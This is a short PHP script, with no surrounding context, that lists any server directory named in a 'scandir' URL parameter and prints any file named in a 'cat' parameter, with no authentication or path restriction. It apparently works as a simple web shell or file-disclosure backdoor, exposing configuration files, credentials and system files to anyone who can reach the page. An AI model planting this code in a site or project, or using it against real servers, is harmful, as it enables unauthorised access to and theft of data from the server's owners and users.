<?php
if (isset($_GET['scandir'])) {
    $dir = $_GET['scandir'];
    $files = scandir($dir);
    echo "<pre>";
    foreach ($files as $file) {
        echo $file . "\n";
    }
    echo "</pre>";
}

if (isset($_GET['cat'])) {
    $file = $_GET['cat'];
    if (file_exists($file)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } else {
        echo "File not found.";
    }
}
?>
